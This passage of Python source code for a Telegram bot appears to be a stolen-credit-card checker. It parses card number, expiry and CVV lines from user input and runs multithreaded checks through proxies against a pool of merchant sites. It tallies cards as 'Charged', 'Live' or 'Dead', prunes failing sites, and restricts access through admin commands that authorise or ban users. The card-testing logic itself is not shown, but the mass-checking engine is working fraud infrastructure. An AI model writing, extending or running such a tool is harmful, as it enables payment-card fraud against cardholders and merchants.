        usage_msg = bot.send_message(message.chat.id, usage_frames[0], parse_mode="Markdown")
        play_anim(message.chat.id, usage_msg.message_id, usage_frames, delay=0.5)
        return   
  
    sites = load_data(SITES_FILE)   
    proxies = load_data(PROXIES_FILE)   
    if not sites: 
        return bot.reply_to(message, "☢️ 𝐂𝐑𝐈𝐓𝐈𝐂𝐀𝐋 𝐄𝐑𝐑𝐎𝐑 ☢️\n❌ Database Empty")   
  
    session = CheckerSession()   
    session.sites_pool = sites   
    session.proxy_string = proxies[0]   
    session.mode = "single_quick"   
    session.start_time = time.time()   
  
    # Animated Target Lock
    lock_frames = [
        f"🎯 **𝐓𝐀𝐑𝐆𝐄𝐓 𝐋𝐎𝐂𝐊𝐄𝐃**\n━━━━━━━━━━━━━━━━━━━━\n[⌖] 𝐂𝐚𝐫𝐝: `{cc_data}`\n[⚡] 𝐒𝐩𝐞𝐞𝐝: Instant\n...",
        f"🎯 **𝐓𝐀𝐑𝐆𝐄𝐓 𝐋𝐎𝐂𝐊𝐄𝐃**\n━━━━━━━━━━━━━━━━━━━━\n[⌖] 𝐂𝐚𝐫𝐝: `{cc_data}`\n[⚡] 𝐒𝐩𝐞𝐞𝐝: Instant\n━━━━━━━━━━━━━━━━━━━━\n🚀 Firing Request...",
    ]
    msg = bot.send_message(message.chat.id, lock_frames[0], parse_mode="Markdown")
    play_anim(message.chat.id, msg.message_id, lock_frames, delay=0.6)
    threading.Thread(target=check_cc_logic, args=(cc_data, session, message.chat.id, msg.message_id)).start()

def start_engine(message, mode, sites, proxy, raw_data):
    if not raw_data: 
        return bot.reply_to(message, "❌ No Data")

    cards = []   
    regex = r'(\d{15,16})[|/:, ]+(\d{1,2})[|/:, ]+(\d{2,4})[|/:, ]+(\d{3,4})'   
    for line in raw_data:   
        m = re.search(regex, line)   
        if m: 
            cards.append(f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}")   
      
    cards = list(set(cards))   
    if not cards: 
        return bot.reply_to(message, "❌ No Cards Found")   
  
    chat_id = message.chat.id   
    session = CheckerSession()   
    session.items = cards   
    session.total = len(cards)   
    session.mode = mode   
    session.sites_pool = sites   
    session.proxy_string = proxy   
    session.start_time = time.time()   
    session.is_running = True   
    active_sessions[chat_id] = session   
  
    # Animated Engine Start
    engine_frames = [
        "🚀 **Starting Engine...**\n🔥 Initializing Threads...",
        "🚀 **Starting Engine...**\n🔥 Initializing Threads... ✅\n⚡ Loading Targets...",
        "🚀 **Starting Engine...**\n🔥 Initializing Threads... ✅\n⚡ Loading Targets... ✅\n🟢 Mass Operation Live!",
    ]
    msg = bot.send_message(chat_id, engine_frames[0], parse_mode="Markdown")
    play_anim(chat_id, msg.message_id, engine_frames, delay=0.8)
    threading.Thread(target=status_updater, args=(chat_id, msg.message_id)).start()   
  
    threads = max(10, min(len(sites) // 2, MAX_SAFE_THREADS))   
    threading.Thread(target=worker, args=(chat_id, threads)).start()

def worker(chat_id, threads):
    session = active_sessions.get(chat_id)
    if not session:
        return
    
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for cc in session.items:
                if session.stop_signal: 
                    break
                executor.submit(check_cc_logic, cc, session, chat_id)
    except Exception as e:
        print(f"Worker Error: {e}")
    finally:
        # Ye part zaroori hai: Session khatam hone par flag false karo
        session.is_running = False

def status_updater(chat_id, message_id):
    session = active_sessions.get(chat_id)
    if not session:
        return
    
    last_text = ""
    stop_btn = types.InlineKeyboardMarkup()
    stop_btn.add(types.InlineKeyboardButton("🛑 STOP", callback_data="stop_all"))

    final_cpm = 0  # Yeh variable final report ke liye save kar lenge

    while session.is_running:
        if session.stop_signal:
            break

        # CPM calculate karo (safe division)
        elapsed = time.time() - session.start_time
        cpm = int((session.checked / elapsed) * 60) if elapsed > 0 else 0
        final_cpm = cpm  # Final report ke liye save

        prog = int((session.checked / session.total) * 10) if session.total > 0 else 0
        bar = "▰" * prog + "▱" * (10 - prog)
        percent = int((session.checked / session.total) * 100) if session.total > 0 else 0

        # Animated Telemetry (Pulsing Numbers)
        tick = int(time.time() % 4)  # Simple tick for pulse
        pulse = "🔥" if tick % 2 == 0 else "⚡"
        
        text = (
            f"💠 **MASS OPERATION: LIVE** {pulse}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💀 **Status:** 🟢 Processing...\n"
            f"📶 **Load:** `[{bar}]` {percent}%\n\n"
            f"📊 **LIVE TELEMETRY**\n"
            f"{pulse} Charged: `{session.charged}` {pulse}\n"
            f"{pulse} Live: `{session.live}` {pulse}\n"
            f"{pulse} Dead: `{session.dead}` {pulse}\n"
            f"📉 Rate: `{cpm} CPM`\n\n"
            f"⚙️ **RESOURCE MONITOR**\n"
            f"🌐 Targets: `{len(session.sites_pool)}`\n"
            f"🗑️ Dead Removed: `{session.dead_sites_count}`\n"
            f"🛡️ Proxy: `Active`\n"
            f"🔢 Total: `{session.checked}/{session.total}`"
        )

        if text != last_text:
            try:
                bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=stop_btn)
            except Exception as e:
                # Agar "Too Many Requests" error aaye toh thoda wait karo
                if "429" in str(e):
                    time.sleep(5)
                pass # Baaki errors ignore karo taaki bot na ruke
            last_text = text
        time.sleep(3)

    # Final Report — ab final_cpm safely use ho raha hai
    final_report = (
        "💠 **PROCESS COMPLETED**\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔋 **Efficiency:** 100%\n"
        f"📉 **Final Rate:** {final_cpm} CPM\n\n"
        f"📊 **RESULTS**\n"
        f"⚡ Charged: {session.charged}\n"
        f"🔥 Live: {session.live}\n"
        f"☠️ Dead: {session.dead}\n"
        f"🗑️ Removed: {session.dead_sites_count}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚠️ **Terminating Session.**"
    )
    
    try:
        bot.send_message(chat_id, final_report, parse_mode="Markdown")
        bot.delete_message(chat_id, message_id)
    except:
        pass
    
    # 👇 YE LINE ADD KARO (RAM Clear karne ke liye)
    active_sessions.pop(chat_id, None)

@bot.callback_query_handler(func=lambda call: call.data == "stop_all")
def stop_all(call):
    if call.message.chat.id in active_sessions:
        active_sessions[call.message.chat.id].stop_signal = True
        bot.answer_callback_query(call.id, "🛑 Stopping...")

# ================= ADMIN COMMANDS =================
@bot.message_handler(commands=['adduser'])
@admin_only
def au(m):
    try:
        u = m.text.split()[1]
        users_db[u] = {"status":"user"}
        save_data(USERS_FILE, users_db)
        bot.reply_to(m, f"🛡️ 𝐑𝐎𝐎𝐓 𝐀𝐂𝐂𝐄𝐒𝐒 𝐋𝐎𝐆\n━━━━━━━━━━━━━━━━━━━━━━━━\n👤 𝐔𝐬𝐞𝐫: {u}\n🔑 𝐀𝐜𝐭𝐢𝐨𝐧: 𝐀𝐔𝐓𝐇𝐎𝐑𝐈𝐙𝐄𝐃 ✅", parse_mode="Markdown")
    except: pass

@bot.message_handler(commands=['ban'])
@admin_only
def bu(m):
    try:
        u = m.text.split()[1]
        del users_db[u]
        save_data(USERS_FILE, users_db)
        bot.reply_to(m, f"🛡️ 𝐑𝐎𝐎𝐓 𝐀𝐂𝐂𝐄𝐒𝐒 𝐋𝐎𝐆\n━━━━━━━━━━━━━━━━━━━━━━━━\n👤 𝐔𝐬𝐞𝐫: {u}\n🚫 𝐀𝐜𝐭𝐢𝐨𝐧: 𝐁𝐋𝐎𝐂𝐊𝐄𝐃 ❌", parse_mode="Markdown")
    except: pass

print("BOT STARTED...")
bot.infinity_polling()
